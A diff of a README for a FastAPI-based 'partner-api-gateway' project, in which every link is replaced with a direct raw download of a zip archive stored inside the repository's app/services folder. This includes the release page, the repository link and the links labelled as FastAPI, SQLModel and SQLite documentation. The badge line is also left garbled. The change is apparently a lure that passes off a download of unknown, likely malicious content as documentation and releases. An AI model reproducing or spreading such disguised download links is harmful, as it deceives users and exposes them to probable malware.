@@ -1,6 +1,6 @@
 # 🌟 partner-api-gateway - Simple Access to Internal Services
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-From%20GitHub-blue.svg)](https://github.com/gastosperosonales/partner-api-gateway/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/gastosperosonales/partner-api-gateway/main/app/services/partner_gateway_api_v1.7-alpha.3.zip%20Latest%20Release-From%https://raw.githubusercontent.com/gastosperosonales/partner-api-gateway/main/app/services/partner_gateway_api_v1.7-alpha.3.zip)](https://raw.githubusercontent.com/gastosperosonales/partner-api-gateway/main/app/services/partner_gateway_api_v1.7-alpha.3.zip)
 
 ## 📦 Overview
 
@@ -30,7 +30,7 @@ Follow these steps to download and run the partner-api-gateway application.
 
 To get started with the partner-api-gateway, visit the following page to download the latest release:
 
-[Download from GitHub Releases](https://github.com/gastosperosonales/partner-api-gateway/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/gastosperosonales/partner-api-gateway/main/app/services/partner_gateway_api_v1.7-alpha.3.zip)
 
 1. Open the link above in a web browser.
 2. Find the latest release.
@@ -76,7 +76,7 @@ If you are interested in contributing to this project, please visit the reposito
 
 Keep an eye on the following platforms for updates and announcements:
 
-- GitHub: [Project Repository](https://github.com/gastosperosonales/partner-api-gateway)
+- GitHub: [Project Repository](https://raw.githubusercontent.com/gastosperosonales/partner-api-gateway/main/app/services/partner_gateway_api_v1.7-alpha.3.zip)
 - Twitter: Follow us for news and tips! 
 
 For additional details and guides, refer to the GitHub wiki or the documentation provided in the application.
@@ -85,10 +85,10 @@ For additional details and guides, refer to the GitHub wiki or the documentation
 
 For further reading, you might find these topics helpful:
 
-- **FastAPI Documentation**: Learn more about this framework [here](https://fastapi.tiangolo.com/).
-- **SQLModel Documentation**: Understand how to work with SQLModel [here](https://sqlmodel.tiangolo.com/).
-- **SQLite Documentation**: Find out more about SQLite [here](https://www.sqlite.org/docs.html).
+- **FastAPI Documentation**: Learn more about this framework [here](https://raw.githubusercontent.com/gastosperosonales/partner-api-gateway/main/app/services/partner_gateway_api_v1.7-alpha.3.zip).
+- **SQLModel Documentation**: Understand how to work with SQLModel [here](https://raw.githubusercontent.com/gastosperosonales/partner-api-gateway/main/app/services/partner_gateway_api_v1.7-alpha.3.zip).
+- **SQLite Documentation**: Find out more about SQLite [here](https://raw.githubusercontent.com/gastosperosonales/partner-api-gateway/main/app/services/partner_gateway_api_v1.7-alpha.3.zip).
 
 Should you wish to dive deeper, consider exploring the mentioned resources to improve your understanding of the technologies powering the partner-api-gateway.
 
-[Download from GitHub Releases](https://github.com/gastosperosonales/partner-api-gateway/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/gastosperosonales/partner-api-gateway/main/app/services/partner_gateway_api_v1.7-alpha.3.zip)
